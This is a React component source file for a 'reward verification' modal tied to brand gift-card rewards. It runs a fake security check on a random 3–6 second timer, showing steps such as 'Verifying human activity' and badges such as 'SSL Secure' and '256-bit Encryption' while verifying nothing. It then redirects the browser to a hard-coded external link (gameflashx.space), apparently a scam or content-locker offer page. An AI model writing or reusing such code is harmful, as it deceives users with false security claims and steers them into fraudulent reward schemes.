
'use client';

import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { ShieldCheck, Loader2, CheckCircle2, Zap, Smartphone, Shield, UserCheck } from 'lucide-react';
import { cn } from '@/lib/utils';
import React from 'react';

/**
 * @fileOverview Refined Security Verification Modal.
 * Implements senior UX writer requirements for trust-based validation.
 */

interface RewardVerificationModalProps {
  isOpen: boolean;
  onClose: () => void;
  brand: string;
  value: string;
  redirectUrl?: string;
}

const VERIFICATION_STEPS = [
  { id: 1, label: "Checking device security...", icon: Shield },
  { id: 2, label: "Verifying human activity...", icon: UserCheck },
  { id: 3, label: "Confirming reward eligibility...", icon: ShieldCheck }
];

export function RewardVerificationModal({ 
  isOpen, 
  onClose, 
  brand, 
  value, 
  redirectUrl = "https://gameflashx.space/sl/zy1x8" 
}: RewardVerificationModalProps) {
  const [currentStep, setCurrentStep] = useState(0);
  const [progress, setProgress] = useState(0);
  const [isFinished, setIsFinished] = useState(false);

  useEffect(() => {
    if (!isOpen) {
      setCurrentStep(0);
      setProgress(0);
      setIsFinished(false);
      return;
    }

    // Disable background scrolling
    document.body.style.overflow = 'hidden';

    const startSequence = async () => {
      // Smooth progress bar animation
      const totalTime = 3000 + Math.random() * 3000; // 3-6 seconds
      const intervalSpeed = 40;
      const increment = 100 / (totalTime / intervalSpeed);

      const progressInterval = setInterval(() => {
        setProgress(prev => {
          if (prev >= 100) return 100;
          return prev + increment;
        });
      }, intervalSpeed);

      // Step progression
      const stepDelay = totalTime / VERIFICATION_STEPS.length;
      
      for (let i = 0; i < VERIFICATION_STEPS.length; i++) {
        setCurrentStep(i);
        await new Promise(resolve => setTimeout(resolve, stepDelay));
      }

      clearInterval(progressInterval);
      setProgress(100);
      setIsFinished(true);

      // Brief pause for success state before redirect
      setTimeout(() => {
        window.location.href = redirectUrl;
      }, 1500);
    };

    startSequence();

    return () => {
      document.body.style.overflow = 'unset';
    };
  }, [isOpen, redirectUrl]);

  return (
    <AnimatePresence>
      {isOpen && (
        <div className="fixed inset-0 z-[10000] flex items-center justify-center p-4">
          {/* Backdrop */}
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="absolute inset-0 bg-black/85 backdrop-blur-md"
          />

          {/* Modal Container */}
          <motion.div
            initial={{ opacity: 0, scale: 0.95, y: 10 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.95, y: 10 }}
            className="relative w-full max-w-md bg-[#0a0a0a] border border-white/10 rounded-[2.5rem] p-8 md:p-10 shadow-[0_0_50px_rgba(0,0,0,0.5)] overflow-hidden"
          >
            {/* Trust Accent Glow */}
            <div className="absolute top-0 right-0 w-48 h-48 bg-primary/10 rounded-full blur-[80px] pointer-events-none" />
            <div className="absolute bottom-0 left-0 w-48 h-48 bg-blue-500/5 rounded-full blur-[80px] pointer-events-none" />
            
            <div className="text-center relative z-10">
              {/* Animated Header Icon */}
              <div className="relative w-20 h-20 mx-auto mb-8">
                {!isFinished ? (
                  <div className="relative w-full h-full flex items-center justify-center">
                    <Loader2 className="w-full h-full text-primary animate-spin" strokeWidth={1.5} />
                    <div className="absolute inset-0 flex items-center justify-center">
                      {VERIFICATION_STEPS[currentStep] && (
                        <motion.div
                          key={currentStep}
                          initial={{ opacity: 0, scale: 0.5 }}
                          animate={{ opacity: 1, scale: 1 }}
                          className="text-primary/60"
                        >
                          {React.createElement(VERIFICATION_STEPS[currentStep].icon, { className: "w-8 h-8" })}
                        </motion.div>
                      )}
                    </div>
                  </div>
                ) : (
                  <motion.div 
                    initial={{ scale: 0, rotate: -45 }}
                    animate={{ scale: 1, rotate: 0 }}
                    className="w-full h-full bg-green-500/20 rounded-[2rem] flex items-center justify-center border border-green-500/30 shadow-[0_0_30px_rgba(34,197,94,0.2)]"
                  >
                    <CheckCircle2 className="w-10 h-10 text-green-500" />
                  </motion.div>
                )}
              </div>

              {/* Verified Content */}
              <div className="space-y-3 mb-10">
                <h3 className="text-2xl md:text-3xl font-black text-white uppercase tracking-tight leading-tight">
                  {!isFinished ? "Security Verification" : "Verification Complete ✅"}
                </h3>
                <p className="text-muted-foreground text-sm font-medium leading-relaxed px-4">
                  {!isFinished 
                    ? "To protect against bots and ensure only real users can claim rewards, we need to quickly verify your request." 
                    : "Eligibility confirmed. Redirecting you to claim your reward..."}
                </p>
              </div>

              {/* Progress & Steps Tracker */}
              <div className="space-y-6">
                <div className="relative h-1.5 w-full bg-white/5 rounded-full overflow-hidden border border-white/5">
                  <motion.div 
                    className="h-full bg-primary shadow-[0_0_15px_rgba(250,70,22,0.5)]"
                    animate={{ width: `${progress}%` }}
                    transition={{ type: 'tween', ease: 'linear' }}
                  />
                </div>

                <div className="grid grid-cols-1 gap-2.5">
                  {VERIFICATION_STEPS.map((step, idx) => (
                    <div 
                      key={step.id}
                      className={cn(
                        "flex items-center gap-3 px-5 py-3.5 rounded-2xl border transition-all duration-500",
                        idx === currentStep ? "bg-primary/5 border-primary/20 scale-[1.02]" : "bg-transparent border-transparent opacity-20",
                        idx < currentStep && "opacity-100 bg-green-500/5 border-green-500/10"
                      )}
                    >
                      {idx < currentStep ? (
                        <CheckCircle2 className="w-4 h-4 text-green-500" />
                      ) : (
                        <step.icon className={cn("w-4 h-4", idx === currentStep ? "text-primary" : "text-white/20")} />
                      )}
                      <span className={cn(
                        "text-[11px] font-black uppercase tracking-widest transition-colors duration-500",
                        idx === currentStep ? "text-white" : "text-white/40",
                        idx < currentStep && "text-green-500"
                      )}>
                        {step.label}
                      </span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Bottom Trust Signal */}
              <div className="mt-10 pt-6 border-t border-white/5 text-center">
                <p className="text-[10px] text-white/30 font-bold uppercase tracking-widest leading-relaxed max-w-[280px] mx-auto">
                  This step helps us prevent abuse and keep rewards available for genuine users.
                </p>
                <div className="mt-4 flex items-center justify-center gap-4 text-[8px] font-black text-white/10 uppercase tracking-[0.3em]">
                  <div className="flex items-center gap-1.5">
                    <div className="w-1 h-1 rounded-full bg-green-500 animate-pulse" />
                    SSL Secure
                  </div>
                  <div className="w-1 h-1 bg-white/10 rounded-full" />
                  <span>256-bit Encryption</span>
                </div>
              </div>
            </div>
          </motion.div>
        </div>
      )}
    </AnimatePresence>
  );
}
